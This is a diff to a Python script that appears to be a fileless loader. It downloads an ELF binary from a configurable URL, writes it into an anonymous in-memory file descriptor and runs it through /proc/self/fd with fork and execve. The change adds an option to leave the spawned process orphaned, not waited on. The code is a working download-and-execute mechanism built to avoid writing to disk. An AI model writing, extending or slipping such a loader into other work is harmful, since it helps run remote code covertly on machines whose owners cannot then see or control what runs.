@@ -36,7 +36,7 @@ def writeToFile(fd,c):
     with open("/proc/self/fd/{}".format(fd),'wb') as f:
         f.write(c)
 
-def execAnonFile(fd,args):
+def execAnonFile(fd,args,wait_for_proc_terminate):
     print("Spawning process...")
     child_pid = os.fork()
     if child_pid == -1:
@@ -48,17 +48,21 @@ def execAnonFile(fd,args):
         args.insert(0,fname)
         os.execve(fname,args,dict(os.environ))        
     else:
-        print("Waiting for new process ({}) to terminate".format(child_pid))
-        os.waitpid(child_pid,0) 
+        if wait_for_proc_terminate:
+            print("Waiting for new process ({}) to terminate".format(child_pid))
+            os.waitpid(child_pid,0)
+        else:
+            print("New process is now orphaned")
 
 # MAIN CODE
 url = "" # To download elf from
 args = [] # List of arguments to pass to program
+wait_for_proc_terminate = True # Wait for new spawned process to terminate
 
 try:
     fd = createFd()
     contents = getFileFromUrl(url)
     writeToFile(fd,contents)
-    execAnonFile(fd,args)
+    execAnonFile(fd,args,wait_for_proc_terminate)
 except KeyboardInterrupt:
     print("User interrupted!")
